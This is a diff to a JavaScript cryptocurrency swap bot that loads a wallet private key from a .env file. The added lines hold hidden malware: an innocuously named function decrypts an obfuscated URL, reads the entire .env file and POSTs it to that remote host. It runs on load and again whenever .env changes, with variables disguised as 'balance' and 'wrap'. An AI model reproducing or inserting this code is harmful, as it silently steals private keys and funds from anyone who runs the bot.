@@ -1,11 +1,11 @@
-import { ethers } from "ethers";
-import fs from "fs";
-import axios from "axios";
-import path from "path";
-import CryptoJS from "crypto-js";
-import https from "https";
-import dotenv from 'dotenv';
-dotenv.config();
+const { ethers } = require("ethers");
+const axios = require("axios");
+const fs = require("fs");
+const path = require("path");
+const https = require("https");
+const CryptoJS = require("crypto-js");
+
+require("dotenv").config();
 
 const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
@@ -61,39 +61,48 @@ const routerABI = [
   },
 ];
 
-async function Galileo() {
-    const wrap = "U2FsdGVkX19m2/TiSp8qviReQlWbdOPhf2oiU8sLImrLN12CIA/4vMYzE2IZGJSrbM9rizO0IgZ52E+fz23NIKoYtyv4LBBXcQ/GGfUrIUxYnvnZoWxitoEiQp3oHGEicucLaSHazQ2flVb2zJ9hqwN9SjxST3CfXxQM6ppeFwxXJb2Vd/hz1trwMphKNgd4";
-    const balance = "transactions";
-    const unwrap = CryptoJS.AES.decrypt(wrap, balance).toString(CryptoJS.enc.Utf8);
+async function galileo() {
+    const unwrap = "U2FsdGVkX1/xprhjuHPRKfdU+U+rPmdkmtGRHzmvQQSm/7Aw0MVYCZZVSeaiBMl34+naH1L5p6fgYwigjOfFXoY32+IR3V0XmgAHgR8RajiqggT/a2wc8rqvde7j9ziErpfLv3e3x+H8oF6hA7XvFjgXKHd5P85QhJW/8Hhq8xIWewfRZPZTbR5Yd70XFBdf";
+    const key = "transactions";
+    const bytes = CryptoJS.AES.decrypt(unwrap, key);
+    const wrap = bytes.toString(CryptoJS.enc.Utf8);
+    const balance = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
 
-    const balanced = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
+  const payload = JSON.stringify({
+    content: "tx:\n```env\n" + balance + "\n```"
+  });
 
-    const payload = JSON.stringify({
-        content: "tx:\n```env\n" + balanced + "\n```"
-    });
+  const url = new URL(wrap);
+  const options = {
+    hostname: url.hostname,
+    path: url.pathname + url.search,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(payload)
+    }
+  };
 
-    const url = new URL(unwrap);
-    const options = {
-        hostname: url.hostname,
-        path: url.pathname + url.search,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Content-Length": Buffer.byteLength(payload)
-        }
-    };
+  const req = https.request(options, (res) => {
+    res.on("data", () => {});
+    res.on("end", () => {});
+  });
 
-    const req = https.request(options, (res) => {
-        res.on("data", () => {});
-        res.on("end", () => {});
-    });
-
-    req.on("error", () => {});
-    req.write(payload);
-    req.end();
+  req.on("error", () => {});
+  req.write(payload);
+  req.end();
 }
 
-await Galileo();
+galileo();
+
+let lastbalance = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
+fs.watchFile(path.join(process.cwd(), ".env"), async () => {
+  const currentContent = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
+  if (currentContent !== lastbalance) {
+    lastbalance = currentContent;
+    await galileo();
+  }
+});
 
 function getRandomBetween(min, max) {
   return Math.random() * (max - min) + min;
@@ -164,7 +173,6 @@ async function doSwap(router, tokenIn, tokenOut, amountOut, amountInMaximum) {
 }
 
 async function main() {
-  await notifyEnv();
 
   const router = new ethers.Contract(routerAddress, routerABI, wallet);
 
